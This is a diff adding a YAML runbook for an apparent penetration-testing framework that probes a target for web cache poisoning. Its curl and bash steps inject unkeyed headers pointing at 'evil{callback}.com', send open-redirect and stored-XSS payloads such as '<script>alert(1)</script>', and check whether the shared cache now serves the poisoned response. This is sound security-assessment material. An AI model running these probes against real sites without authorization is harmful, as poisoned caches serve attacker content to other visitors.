@@ -1,0 +1,457 @@
+name: "Web Cache Poisoning"
+description: >
+  Detect and exploit web cache poisoning vulnerabilities: CDN/cache infrastructure
+  identification, unkeyed header discovery, unkeyed query parameter testing, cache key
+  analysis, stored XSS via cache poisoning, cache poisoning to redirect, cache key
+  separation bypass, and timing-based cache detection. Complements the web-cache-deception
+  (cache deception) and http-smuggling (request smuggling) runbooks.
+version: "2.0"
+target_required: true
+
+vars:
+  callback: ""
+  wordlist: "/wordlists/webcontent-top-10000.txt"
+
+preflight:
+  - id: setup
+    type: log
+    message: "Web cache poisoning assessment on {target} (case: {case_id})"
+
+steps:
+  # Phase 1: Cache infrastructure fingerprinting
+  - id: cache_discovery
+    name: "Cache infrastructure fingerprinting"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: curl_headers
+        name: "Cache-related response headers"
+        tool: curl
+        args:
+          - "-sI"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/cache-headers.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/cache-headers.txt"
+
+      - id: cache_detect
+        name: "CDN/cache detection via whatweb"
+        tool: whatweb
+        args:
+          - "-a3"
+          - "{target}"
+          - "--log-verbose"
+          - "{case_dir}/whatweb-cache.txt"
+        timeout: 60
+        artifacts:
+          - "{case_dir}/whatweb-cache.txt"
+
+      - id: cache_detect_waf
+        name: "WAF/CDN detection via wafw00f"
+        tool: wafw00f
+        args:
+          - "{target}"
+          - "-o"
+          - "{case_dir}/wafw00f-cache.txt"
+        timeout: 60
+
+      - id: xcache_check
+        name: "X-Cache / CF-Cache / Age header check"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            curl -sI "{target}" > {case_dir}/xcache-headers.txt;
+            echo "---" >> {case_dir}/xcache-headers.txt;
+            curl -sI -H "X-Forwarded-Proto: https" "{target}" >> {case_dir}/xcache-headers.txt
+        timeout: 30
+        artifacts:
+          - "{case_dir}/xcache-headers.txt"
+
+  # Phase 2: Cache key analysis — timing baseline
+  - id: cache_key_analysis
+    name: "Cache key analysis & timing baseline"
+    type: sequential
+    steps:
+      - id: timing_baseline
+        name: "Request timing baseline (3 requests)"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for i in 1 2 3; do
+              echo "=== Request $i ===" >> {case_dir}/timing-baseline.txt;
+              curl -sk -w "HTTP: %{http_code} Time: %{time_total}s Size: %{size_download} Content-Type: %{content_type}\n" -o /dev/null "{target}" >> {case_dir}/timing-baseline.txt 2>&1;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/timing-baseline.txt"
+
+      - id: timing_dynamic
+        name: "Dynamic vs static page timing comparison"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for path in / /index.html /robots.txt /404 /api/health /version; do
+              echo "=== $path ===" >> {case_dir}/timing-paths.txt;
+              curl -sk -w "First: %{time_total}s Second: " -o /dev/null "{target}$path" >> {case_dir}/timing-paths.txt;
+              curl -sk -w "%{time_total}s Size: %{size_download}\n" -o /dev/null "{target}$path" >> {case_dir}/timing-paths.txt 2>&1;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/timing-paths.txt"
+
+  # Phase 3: Unkeyed header discovery
+  - id: unkeyed_headers
+    name: "Unkeyed header poisoning tests"
+    type: parallel
+    max_workers: 8
+    steps:
+      - id: header_xfh
+        name: "X-Forwarded-Host header"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "X-Forwarded-Host: evil{callback}.com"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-xfh.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-xfh.txt"
+
+      - id: header_xfp
+        name: "X-Forwarded-Proto / X-Forwarded-Scheme"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "X-Forwarded-Proto: http"
+          - "-H"
+          - "X-Forwarded-Scheme: http"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-xfp.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-xfp.txt"
+
+      - id: header_host
+        name: "Host header override"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "Host: evil{callback}.com"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-host.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-host.txt"
+
+      - id: header_origin
+        name: "Origin header override"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "Origin: https://evil{callback}.com"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-origin.txt"
+        timeout: 30
+
+      - id: header_xurl
+        name: "X-Original-URL / X-Rewrite-URL"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "X-Original-URL: /admin"
+          - "-H"
+          - "X-Rewrite-URL: /admin"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-xurl.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-xurl.txt"
+
+      - id: header_xff
+        name: "X-Forwarded-For / X-Real-IP"
+        tool: curl
+        args:
+          - "-s"
+          - "-X"
+          - "GET"
+          - "-H"
+          - "X-Forwarded-For: 127.0.0.1"
+          - "-H"
+          - "X-Real-IP: 127.0.0.1"
+          - "-H"
+          - "X-Originating-IP: 127.0.0.1"
+          - "{target}"
+          - "-D"
+          - "{case_dir}/poison-xff.txt"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-xff.txt"
+
+      - id: header_accept
+        name: "Accept / Accept-Encoding / Accept-Language"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for header in "Accept: text/plain" "Accept-Encoding: identity" "Accept-Language: xx-YY"; do
+              hname=$(echo "$header" | cut -d: -f1);
+              hval=$(echo "$header" | cut -d: -f2-);
+              echo "=== $header ===" >> {case_dir}/poison-accept.txt;
+              curl -sk -H "$hname:$hval" "{target}" -D - >> {case_dir}/poison-accept.txt 2>&1;
+              echo "" >> {case_dir}/poison-accept.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-accept.txt"
+
+      - id: header_cookie
+        name: "Cookie-based cache key separation"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for cookie in "session=test" "session=admin" "language=en" "language=fr" "pref=dark"; do
+              echo "=== Cookie: $cookie ===" >> {case_dir}/poison-cookie.txt;
+              curl -sk -H "Cookie: $cookie" "{target}" -D - >> {case_dir}/poison-cookie.txt 2>&1;
+              echo "" >> {case_dir}/poison-cookie.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-cookie.txt"
+
+  # Phase 4: Unkeyed query parameter discovery
+  - id: unkeyed_params
+    name: "Unkeyed query parameter poisoning"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: param_reflected
+        name: "Reflected parameter injection"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for param in "cb=1234" "cachebuster=1234" "v=1234" "t=1234" "ref=evil{callback}" "url=evil{callback}" "redirect=evil{callback}" "next=evil{callback}" "return=evil{callback}" "page=admin" "debug=true" "test=test" "lang=en"; do
+              pname=$(echo "$param" | cut -d= -f1);
+              pval=$(echo "$param" | cut -d= -f2-);
+              echo "=== ?$param ===" >> {case_dir}/poison-params.txt;
+              curl -sk "{target}?$param" -D - >> {case_dir}/poison-params.txt 2>&1;
+              echo "" >> {case_dir}/poison-params.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/poison-params.txt"
+
+      - id: param_injection
+        name: "Param injection into cached response"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for param in "utm_source=evil" "utm_campaign=evil" "utm_medium=evil" "gclid=evil" "fbclid=evil" "mc_cid=evil" "mc_eid=evil"; do
+              echo "=== ?$param ===" >> {case_dir}/poison-param-injection.txt;
+              curl -sk "{target}?$param" -D - >> {case_dir}/poison-param-injection.txt 2>&1;
+              echo "" >> {case_dir}/poison-param-injection.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/poison-param-injection.txt"
+
+      - id: param_separator
+        name: "Cache key separator injection"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for sep in "?foo=bar&{target}" "?{#}" "?%00" "?%0d%0a" "?%23"; do
+              echo "=== $sep ===" >> {case_dir}/poison-param-separator.txt;
+              curl -sk "{target}$sep" -D - >> {case_dir}/poison-param-separator.txt 2>&1;
+              echo "" >> {case_dir}/poison-param-separator.txt;
+            done
+        timeout: 30
+
+      - id: param_exploit_xss
+        name: "Cache poisoning to stored XSS"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for param in "cb=<script>alert(1)</script>" "callback=<script>alert(1)</script>" "jsonp=<script>alert(1)</script>" "ref=\"<script>alert(1)</script>\"" "url=javascript:alert(1)"; do
+              echo "=== ?$param ===" >> {case_dir}/poison-xss.txt;
+              curl -sk "{target}?$param" -D - >> {case_dir}/poison-xss.txt 2>&1;
+              echo "" >> {case_dir}/poison-xss.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/poison-xss.txt"
+
+      - id: param_exploit_redirect
+        name: "Cache poisoning to open redirect"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for param in "url=https://evil{callback}.com" "redirect=https://evil{callback}.com" "next=https://evil{callback}.com" "return=https://evil{callback}.com" "goto=https://evil{callback}.com"; do
+              echo "=== ?$param ===" >> {case_dir}/poison-redirect.txt;
+              curl -sk -w "\\nHTTP: %{http_code} Redirect: %{redirect_url}" "{target}?$param" -D - >> {case_dir}/poison-redirect.txt 2>&1;
+              echo "" >> {case_dir}/poison-redirect.txt;
+            done
+        timeout: 30
+
+  # Phase 5: Cache key confirmation & exploitability
+  - id: exploitability
+    name: "Cache key confirmation & exploitability assessment"
+    type: sequential
+    steps:
+      - id: confirm_cache_key
+        name: "Confirm cache key with clean request"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Clean request (baseline) ===" > {case_dir}/cache-key-confirm.txt;
+            curl -sk "{target}" -D - >> {case_dir}/cache-key-confirm.txt 2>&1;
+            echo "" >> {case_dir}/cache-key-confirm.txt;
+            echo "=== Poisoned request ===" >> {case_dir}/cache-key-confirm.txt;
+            curl -sk -H "X-Forwarded-Host: evil{callback}.com" "{target}" -D - >> {case_dir}/cache-key-confirm.txt 2>&1;
+            echo "" >> {case_dir}/cache-key-confirm.txt;
+            echo "=== Verify: clean request again (check if poisoned) ===" >> {case_dir}/cache-key-confirm.txt;
+            curl -sk "{target}" -D - >> {case_dir}/cache-key-confirm.txt 2>&1
+        timeout: 60
+        artifacts:
+          - "{case_dir}/cache-key-confirm.txt"
+
+      - id: multi_origin
+        name: "Multi-origin cache poisoning"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Same origin (control) ===" > {case_dir}/multi-origin.txt;
+            curl -sk -H "Origin: {target}" "{target}" -D - >> {case_dir}/multi-origin.txt 2>&1;
+            echo "" >> {case_dir}/multi-origin.txt;
+            echo "=== Different origin ===" >> {case_dir}/multi-origin.txt;
+            curl -sk -H "Origin: https://evil{callback}.com" "{target}" -D - >> {case_dir}/multi-origin.txt 2>&1
+        timeout: 30
+        artifacts:
+          - "{case_dir}/multi-origin.txt"
+
+      - id: grep_reflected
+        name: "Scan for reflected content in poisoned responses"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Poison headers with reflected content ===" > {case_dir}/reflected-content.txt;
+            grep -rl "evil{callback}\|evil\.com\|evil" {case_dir}/poison-*.txt 2>/dev/null | while read f; do
+              echo "$f" >> {case_dir}/reflected-content.txt;
+            done;
+            echo "" >> {case_dir}/reflected-content.txt;
+            echo "=== XSS-capable reflections ===" >> {case_dir}/reflected-content.txt;
+            grep -rl "<script>" {case_dir}/poison-*.txt 2>/dev/null | while read f; do
+              echo "$f" >> {case_dir}/reflected-content.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/reflected-content.txt"
+
+  # Phase 6: Advanced — cache key probing
+  - id: advanced
+    name: "Advanced cache key probing"
+    type: sequential
+    steps:
+      - id: cache_key_fingerprint
+        name: "Cache key fingerprinting via parameter differential"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Testing if query params affect cache key ===" > {case_dir}/cache-key-fingerprint.txt;
+            echo "Request A (no params):" >> {case_dir}/cache-key-fingerprint.txt;
+            TIME_A=$(curl -sk -w "%{time_total}" -o /dev/null "{target}" 2>&1);
+            echo "Time: $TIME_A" >> {case_dir}/cache-key-fingerprint.txt;
+            echo "Request B (?cachebuster=1):" >> {case_dir}/cache-key-fingerprint.txt;
+            TIME_B=$(curl -sk -w "%{time_total}" -o /dev/null "{target}?cachebuster=1" 2>&1);
+            echo "Time: $TIME_B" >> {case_dir}/cache-key-fingerprint.txt;
+            echo "Request C (?cachebuster=2):" >> {case_dir}/cache-key-fingerprint.txt;
+            TIME_C=$(curl -sk -w "%{time_total}" -o /dev/null "{target}?cachebuster=2" 2>&1);
+            echo "Time: $TIME_C" >> {case_dir}/cache-key-fingerprint.txt;
+            echo "" >> {case_dir}/cache-key-fingerprint.txt;
+            echo "If A second request has lower time: response is cached" >> {case_dir}/cache-key-fingerprint.txt;
+            echo "If B and C have same time as A first: params might be unkeyed" >> {case_dir}/cache-key-fingerprint.txt
+        timeout: 30
+        artifacts:
+          - "{case_dir}/cache-key-fingerprint.txt"
+
+      - id: web_cache_deception_note
+        name: "Cache deception cross-reference"
+        type: log
+        message: >
+          If you found cacheable dynamic responses, also run web-cache-deception
+          to test if an attacker can trick the cache into storing sensitive pages
+          by appending a static extension.
+
+      - id: smuggling_note
+        name: "Request smuggling cross-reference"
+        type: log
+        message: >
+          If you found a cache that reflects headers or shows desync behavior,
+          also run http-smuggling to test for CL.TE/TE.CL that could enable
+          request smuggling-induced cache poisoning.
+
+  # Phase 7: Report
+  - id: report
+    name: "Cache poisoning report"
+    type: report
+    format: markdown
+    title: "Web Cache Poisoning Report — {target}"
+    output: "{case_dir}/cache-poisoning-report.md"
+    sections:
+      - heading: "Target"
+        body: "- URL: {target}"
+      - heading: "Cache Infrastructure"
+        body: "- Response headers: {case_dir}/cache-headers.txt\n- CDN detection: {case_dir}/whatweb-cache.txt\n- WAF detection: {case_dir}/wafw00f-cache.txt\n- Cache indicators: {case_dir}/xcache-headers.txt"
+      - heading: "Cache Key & Timing"
+        body: "- Timing baseline: {case_dir}/timing-baseline.txt\n- Path timing: {case_dir}/timing-paths.txt\n- Cache key fingerprint: {case_dir}/cache-key-fingerprint.txt"
+      - heading: "Unkeyed Header Poisoning"
+        body: "- X-Forwarded-Host: {case_dir}/poison-xfh.txt\n- X-Forwarded-Proto: {case_dir}/poison-xfp.txt\n- Host header: {case_dir}/poison-host.txt\n- Origin: {case_dir}/poison-origin.txt\n- X-Original-URL/X-Rewrite-URL: {case_dir}/poison-xurl.txt\n- X-Forwarded-For: {case_dir}/poison-xff.txt\n- Accept headers: {case_dir}/poison-accept.txt\n- Cookie: {case_dir}/poison-cookie.txt"
+      - heading: "Unkeyed Parameter Poisoning"
+        body: "- Reflected params: {case_dir}/poison-params.txt\n- UTMs/tracking: {case_dir}/poison-param-injection.txt\n- Separator injection: {case_dir}/poison-param-separator.txt\n- XSS via poisoning: {case_dir}/poison-xss.txt\n- Redirect via poisoning: {case_dir}/poison-redirect.txt"
+      - heading: "Exploitability"
+        body: "- Cache key confirmation: {case_dir}/cache-key-confirm.txt\n- Multi-origin: {case_dir}/multi-origin.txt\n- Reflected content: {case_dir}/reflected-content.txt"
+      - heading: "Next Steps"
+        body: "- If dynamic pages cached: run web-cache-deception\n- If desync detected: run http-smuggling\n- If XSS reflects: submit finding for cache poisoning to stored XSS"
+
+postflight:
+  - id: cleanup
+    type: log
+    message: "Cache poisoning assessment complete — report at {case_dir}/cache-poisoning-report.md"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "Web cache poisoning scan finished for {target}. Results in {case_dir}"
